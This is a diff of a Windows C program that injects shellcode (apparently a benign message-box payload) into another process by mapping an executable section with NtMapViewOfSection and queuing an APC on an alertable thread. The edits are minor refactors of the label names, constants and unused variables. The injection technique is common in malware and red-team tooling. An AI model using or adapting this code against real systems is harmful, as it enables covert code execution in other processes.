@@ -6,6 +6,7 @@
 //
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #define STATUS_OPEN_FAILED  0xC0000136
+#define STATUS_SUCCESS      0x00000000
 
 // ReSharper disable CppInconsistentNaming
 typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
@@ -28,7 +29,7 @@ INT main() {
     SIZE_T					dwReqBufSize = sizeof bMessageboxShellcode64;
     LARGE_INTEGER			sectionSize = { dwReqBufSize };
     DWORD                   dwPid;
-    LONG					lRetVal = ERROR_SUCCESS;
+    LONG					lRetVal = STATUS_SUCCESS;
     HANDLE                  hProcess;
     HANDLE                  hTread;
     HANDLE					hSection = NULL;
@@ -72,7 +73,7 @@ INT main() {
     dwPid = processInformation.dwProcessId;
     if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
         lRetVal = STATUS_OPEN_FAILED;
-        goto Cleanup;
+        goto lblCleanup;
     }
 
     //
@@ -106,7 +107,7 @@ INT main() {
     ntStatus = pNtMapViewOfSection(hSection, hProcess, &pRemoteSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);
     if (!NT_SUCCESS(ntStatus)) {
         lRetVal = ntStatus;
-        goto Cleanup;
+        goto lblCleanup;
     }
 
     //
@@ -118,7 +119,7 @@ INT main() {
     QueueUserAPC((PAPCFUNC)apcRoutine, hTread, 0);
     Sleep(1000 * 2);
 
-Cleanup:
+lblCleanup:
     if (hSection) {
         pNtClose(hSection);
     }
@@ -220,12 +221,10 @@ DWORD WINAPI ThreadProc(LPVOID lpParameter) {
 
 HANDLE FindAlertableThread(HANDLE hProcess, DWORD dwPid) {
     HANDLE        hSnapshot, hTread, hEvent[2], hReturn = NULL;
-    LPVOID        rm, pSetEvent, f[6];
+    LPVOID        pSetEvent, f[6];
     THREADENTRY32 threadEntry;
-    SIZE_T        rd;
     DWORD         i;
     CONTEXT       context;
-    ULONG_PTR     p;
     HMODULE       hModule;
 
     // using the offset requires less code but it may
